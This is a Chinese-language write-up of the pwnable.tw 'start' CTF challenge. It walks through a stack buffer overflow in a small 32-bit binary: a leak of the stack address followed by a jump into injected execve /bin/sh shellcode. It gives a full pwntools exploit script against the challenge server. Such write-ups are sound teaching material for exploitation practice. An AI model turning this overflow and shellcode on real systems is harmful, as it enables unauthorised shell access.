pwnable.tw 学习 start

参考：

    http://www.jianshu.com/p/8c13e3ed9589
    http://dogewatch.github.io/2017/04/10/pwnable.tw-Part1/

# start 


利用思路：通过leak出esp地址，对esp之后写入shellcode就会执行，而且执行的shellcode满足小于32字节

做题步骤：

(1)先通过file命令查看x86还是x64

	file start
	start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped

(2)checksec查看何种防护方式

	gdb start
	gdb-peda$ checksec
	CANARY    : disabled
	FORTIFY   : disabled
	NX        : ENABLED
	PIE       : disabled
	RELRO     : disabled

可以看到NX保护开了，但是我们实际在运行中，为什么NX保护会开呢？
但是最后的做法就是看checksec的源码

(3)int 80 中断方式执行代码

sys_write
sys_read
....

[http://syscalls.kernelgrok.com/](http://syscalls.kernelgrok.com/) 中断查询

(4)题目源码

	void _start(){
	  char buf[20] = 'Let's start the CTF:';
	  sys_write(1,buf,20);
	  sys_read(0,buf,60);
	}
	void _exit(){
	  sys_exit();
	}

利用思路：leak出地址，算出shellcode起始地址，然后跳转到shellcode执行

坑点：
checksec 显示NX，但是实际可以shellcode写栈后执行。shellcode在0x14后的位置，因为leak出来得地址是
esp+4的地址，只要加上20就可以调到shellcode，如何计算不是很清楚，可以多加点‘NOP’指令，就可以挂到
下面继续执行了。

(5)exploit：

	from pwn import *
	
	debug = 0
	
	if debug:
		s = process('./start')
		#context.terminal = ['gnome-terminal','-x','sh','c']
		gdb.attach(s,'b _start')
	else:
		s = remote('chall.pwnable.tw',10000)
	
	addr_1 = p32(0x08048087) # mov ecx,esp
	shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
	
	def leak():
		recv1 = s.recvuntil(':')
		print recv1
		payload = 'a'*20 + addr_1
		s.send(payload)
		print 'send :' + payload
		stack_addr = s.recv(4)
		print 'stack address is %x' % u32(stack_addr)
		return u32(stack_addr)
	
	def pwn(addr):
		payload = 'a'*20 + p32(addr+24)+'\x90'*10+shellcode
		s.send(payload)
		print 'send :' + payload
	
	addr_2 = leak()
	pwn(addr_2)
	s.interactive('\nshell#')

然后提交flag，ok

